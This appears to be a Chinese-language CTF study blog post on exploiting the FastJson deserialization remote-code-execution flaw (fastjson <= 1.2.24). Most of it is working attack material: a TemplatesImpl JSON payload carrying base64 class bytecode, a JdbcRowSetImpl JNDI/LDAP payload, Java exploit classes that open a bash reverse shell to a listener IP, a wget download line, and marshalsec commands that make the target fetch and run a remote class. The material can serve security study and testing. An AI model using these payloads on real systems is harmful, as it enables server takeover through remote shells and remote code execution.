---
title: FastJson 反序列化漏洞利用笔记
layout: post
category: [CTF]
tagline: 
show_reward: true
tags: [FastJson, CTF]
---

影响范围

fastjson <= 1.2.24 

## PoC分类

1，基于TemplateImpl
2，基于JNDI Bean Property类型
3，基于JNDI Field类型

使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类，调用其set，get，is方法，fastjson默认开启type属性。Json 字符串中 @type 要放在最前面，否则没法利用。

```java
// 反弹shell不能这样写，会没有效果
Runtime.getRuntime().exec("/bin/bash -i >& /dev/tcp/192.168.10.25/3333 0>&1");
// 需要写成这样
// bash -c "bash -i >& /dev/tcp/192.168.85.128/4545 0>&1"
Runtime.getRuntime().exec(
                    new String[]{"bash", "-c", "bash -i >& /dev/tcp/192.168.85.128/4545 0>&1"});
// 可以执行
Runtime.getRuntime().exec("wget http://x.x.x.x:8080/1.py");
```

## 基于 TemplateImpl 的 PoC

Fastjson基于TemplateImpl 的PoC`限制还比较多`，需要打开SupportNonPublic开关，这个场景是比较少见的。有几个条件：
1. 目标网站使用fastjson库解析json
2. 解析时设置了`Feature.SupportNonPublicField`，否则不支持传入私有属性
3. 目标使用的jdk中存在`TemplatesImpl`类

利用方法
1. 执行 javac Exploit.java，得到 Exploit.class
2. 将 Exploit.class 转成 base64，并替换 payload 中的 _bytecodes

Payload

```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHACQBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAlAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACYBAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAsADAcAJwwAKAApAQAQamF2YS9sYW5nL1N0cmluZwEABGJhc2gBAAItYwEALGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC44NS4xMjgvNDU0NSAwPiYxDAAqACsBAANQb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAgACgAAAAAABAABAAsADAACAA0AAAA/AAUAAQAAAB8qtwABuAACBr0AA1kDEgRTWQQSBVNZBRIGU7YAB1exAAAAAQAOAAAADgADAAAACwAEAAwAHgAPAA8AAAAEAAEAEAABABEAEgABAA0AAAAZAAAABAAAAAGxAAAAAQAOAAAABgABAAAAEwABABEAEwACAA0AAAAZAAAAAwAAAAGxAAAAAQAOAAAABgABAAAAGAAPAAAABAABABQACQAVABYAAgANAAAAJQACAAIAAAAJuwAIWbcACUyxAAAAAQAOAAAACgACAAAAGwAIABwADwAAAAQAAQAXAAEAGAAAAAIAGQ=="],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}
```

Exploit.java

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Poc extends AbstractTranslet {

    public Poc() throws IOException {
        Runtime.getRuntime().exec(
                    new String[]{"bash", "-c", "bash -i >& /dev/tcp/192.168.85.128/4545 0>&1"});
        // Runtime.getRuntime().exec("touch /tmp/success");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException {
    }

    public static void main(String[] args) throws Exception {
        Poc t = new Poc();
    }
}
```

## 基于 JNDI 的 PoC

JNDI Bean Property这个类型，这个类型和JNDI Field类型的区别就在于Bean Property需要借助setter，getter方法触发，而Field类型则没有这个必要。JdbcRowSetImpl刚好就在Bean Property分类之下。这个Poc相对于TemplateImpl却没有一点儿限制，当然java在JDK 6u132, 7u122, or 8u113补了是另外一码事。 PoC具体如下

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.85.128:1389/Exploit","autoCommit":true}
```

使用 [marshalsec](https://github.com/mbechler/marshalsec) 监听一个LDAP Server，FastJson反序列的时候，会先去访问 LDAP Server，然后会指向一个 rmi web 目录的地址，FastJson 会去该地址下载对应的.class 文件，然后执行里面的代码

```
# 本地监听 1389 端口
java -cp .\target\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.85.128:8000/#Exploit

# 执行 payload 后
# Server 会发送：Send LDAP reference result for Exploit redirecting to http://192.168.85.128:8000/Exploit.class
# fastjson 会去访问 http://192.168.85.128:8000/Exploit.class 并执行里面的代码
```

Exploit.java

```java
public class Exploit {
    public Exploit(){
        try {
            // Runtime.getRuntime().exec("calc");
            java.lang.Runtime.getRuntime().exec(
                    new String[]{"bash", "-c", "bash -i >& /dev/tcp/192.168.85.128/4545 0>&1"});
        } catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
```

编译成 class 文件

    javac Exploit.java
    
[marshalsec](https://github.com/mbechler/marshalsec) 需要自己去 GitHub 下载编译成 jar。 

## 参考文献

- [基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析](http://xxlegend.com/2018/10/23/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/)




